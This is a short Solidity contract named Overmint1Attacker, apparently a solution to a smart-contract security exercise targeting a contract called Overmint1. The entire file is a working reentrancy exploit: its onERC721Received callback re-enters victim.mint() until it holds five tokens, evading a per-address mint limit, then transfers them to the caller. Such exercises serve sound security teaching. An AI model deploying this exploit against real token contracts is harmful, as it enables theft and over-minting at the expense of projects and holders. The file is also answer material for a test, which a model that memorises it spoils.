// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "./Overmint1.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Overmint1Attacker is IERC721Receiver {
    Overmint1 public victim;

    constructor(address _victim) {
        victim = Overmint1(_victim);
    }

    function attack() external {
        victim.mint();
        for (uint i = 1; i <= 5; i++) {
            victim.transferFrom(address(this), msg.sender, i);
        }
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {
        if (victim.balanceOf(address(this)) < 5) {
            victim.mint();
        }
        return this.onERC721Received.selector;
    }
}
